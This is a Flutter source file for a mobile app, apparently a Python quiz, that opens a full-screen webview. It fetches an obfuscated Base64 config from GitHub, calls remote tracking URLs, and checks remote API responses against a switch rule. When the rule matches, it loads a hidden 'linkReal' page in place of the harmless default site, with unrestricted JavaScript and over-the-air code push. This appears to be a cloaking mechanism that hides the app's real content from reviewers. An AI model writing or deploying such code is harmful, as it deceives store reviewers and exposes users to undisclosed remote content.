import 'dart:convert';
import 'dart:io';
import 'package:flutter/material.dart';
import 'package:flutter/services.dart';
import 'package:flutter_local_notifications/flutter_local_notifications.dart';
import 'package:http/http.dart' as http;
import 'package:package_info_plus/package_info_plus.dart';
// import 'package:pythonquiz/notification_service.dart';
import 'package:shorebird_code_push/shorebird_code_push.dart';
import 'package:webview_flutter/webview_flutter.dart';


void main() async {
  WidgetsFlutterBinding.ensureInitialized();

  // await NotificationService.init();

  runApp(
    const MaterialApp(debugShowCheckedModeBanner: false, home: SplashScreen()),
  );
}

class SplashScreen extends StatefulWidget {
  const SplashScreen({super.key});

  @override
  State<SplashScreen> createState() => _SplashScreenState();
}

class _SplashScreenState extends State<SplashScreen> {
  String defaultUri = "https://arena-bust-76728000.figma.site";
  String? uri;
  String configLink = "";


  @override
  void initState() {
    super.initState();
    checkInternetAndNavigate();
  }

  @override
  Widget build(BuildContext context) {
    return Scaffold(
      body: Container(
        width: MediaQuery.of(context).size.width,
        height: MediaQuery.of(context).size.height,
        decoration: BoxDecoration(
          gradient: LinearGradient(
            colors: [Colors.lightBlueAccent, Colors.purpleAccent],
            begin: Alignment.topLeft,
            end: Alignment.bottomRight,
          ),
        ),
        child: Center(
          child: CircularProgressIndicator(color: Colors.white),
        ),
      ),
    );
  }

  Future<void> checkInternetAndNavigate() async {
    final info = await PackageInfo.fromPlatform();
    configLink = "https://raw.githubusercontent.com/blaneee/helloworld/refs/heads/main/${info.packageName}/webview.ini";
    print("config link: " + configLink);

    bool online = await hasInternet();

    if (online) {
      loadConfigAndNavigate();
    } else {
      ScaffoldMessenger.of(context).showSnackBar(
        const SnackBar(
          backgroundColor: Colors.red,
          content: Text(
            "No Internet!",
            style: TextStyle(color: Colors.white, fontWeight: FontWeight.bold),
          ),
        ),
      );
    }
  }

  Future<bool> hasInternet() async {
    try {
      final result = await InternetAddress.lookup('google.com');
      if (result.isNotEmpty && result[0].rawAddress.isNotEmpty) {
        return true; // Có Internet
      }
      return false;
    } on SocketException catch (_) {
      return false; // Không có Internet
    }
  }

  void loadConfigAndNavigate() async {
    try {
      // B1: Fetch Base64 config
      final res = await http.get(Uri.parse(configLink));
      if (res.statusCode != 200) throw Exception("Config fetch failed");

      // B2: Decode Base64 → UTF-8
      final decodedData = utf8.decode(base64Decode(cleanBase64(res.body)));

      // B3: Parse JSON
      final jsonData = json.decode(decodedData);
      final String? linkApp = jsonData["linkApp"];
      final String? linkReal = jsonData["linkReal"];
      final List configLDP = jsonData["configLDP"] ?? [];
      final List tracking = jsonData["tracking"] ?? [];
      final bool isCheckAll = jsonData["isCheckAll"] ?? false;
      final bool isExistKey = jsonData["isExistKey"] ?? false;
      final bool isExistValue = jsonData["isExistValue"] ?? false;
      final Map switchApp =
          jsonData["switchApp"] ?? {"key": "null", "value": null};

      // B4: Tracking call
      for (var url in tracking) {
        try {
          final trackRes = await http.get(Uri.parse(url));
          print("Data Tracking: ${trackRes.body}");
        } catch (e) {
          print("Tracking error: $e");
        }
      }

      // B5: Check configLDP
      if (configLDP.isNotEmpty) {
        for (var url in configLDP) {
          try {
            final dataRes = await http.get(Uri.parse(url));
            if (dataRes.statusCode == 200) {
              final data = json.decode(dataRes.body);

              if (isCheckAll) {
                if (data[switchApp["key"]].toString() == switchApp["value"]) {
                  uri = linkReal ?? defaultUri;
                  print(uri);
                } else {
                  uri = defaultUri;
                }
              } else if (isExistKey) {
                if (data.containsKey(switchApp["key"])) {
                  uri = linkReal ?? defaultUri;
                } else {
                  uri = defaultUri;
                }
              } else if (isExistValue) {
                if (data == switchApp["value"]) {
                  uri = linkReal ?? defaultUri;
                } else {
                  uri = defaultUri;
                }
              } else {
                uri = defaultUri;
              }
              print("Data from API: $data");
            }
          } catch (e) {
            print("Error calling API: $e");
          }
        }
      } else {
        print("configLDP is empty");
      }

      Navigator.pushReplacement(
        context,
        MaterialPageRoute(builder: (_) => HomeScreen(uri: uri!)),
      );
    } catch (e) {
      print("Error: $e");
      Navigator.pushReplacement(
        context,
        MaterialPageRoute(builder: (_) => HomeScreen(uri: defaultUri)),
      );
    }
  }

  String cleanBase64(String input) {
    String cleaned = input.replaceAll("\n", "").replaceAll("\r", "").trim();
    while (cleaned.length % 4 != 0) {
      cleaned += "=";
    }
    return cleaned;
  }

}

class HomeScreen extends StatefulWidget {
  String uri;

  HomeScreen({super.key, required this.uri});

  @override
  State<HomeScreen> createState() => _HomeScreenState();
}

class _HomeScreenState extends State<HomeScreen> {
  String get uri => widget.uri;
  late final WebViewController controller;

  @override
  void initState() {
    // TODO: implement initState
    SystemChrome.setEnabledSystemUIMode(SystemUiMode.immersiveSticky);

    controller = WebViewController()
      ..setJavaScriptMode(JavaScriptMode.unrestricted)
      ..loadRequest(Uri.parse(uri));
    controller.setNavigationDelegate(
      NavigationDelegate(
        onPageStarted: (url) => print("Start: $url"),
        onPageFinished: (url) => print("Finish: $url"),
        onWebResourceError: (error) {
          print("❌ WebView error: ${error.errorCode} - ${error.description}");
        },
      ),
    );
    checkUpdate();
  }

  @override
  Widget build(BuildContext context) {
    return Scaffold(
      backgroundColor: Colors.white,
      body: SafeArea(
        bottom: false,
        child: WebViewWidget(controller: controller),
      ),
    );
  }

  Future<void> checkUpdate() async {
    bool isUpdateAvailable = await ShorebirdUpdater().checkForUpdate() == UpdateStatus.outdated;
    if(isUpdateAvailable) {
      ScaffoldMessenger.of(context).showSnackBar(
        SnackBar(
          backgroundColor: Colors.orange,
          content: Text("Update available, downloading..."),
        ),
      );
    }else{
      ScaffoldMessenger.of(context).showSnackBar(
        SnackBar(
          backgroundColor: Colors.green,
          content: Text("Up to date!"),
        ),
      );
    }
  }

}
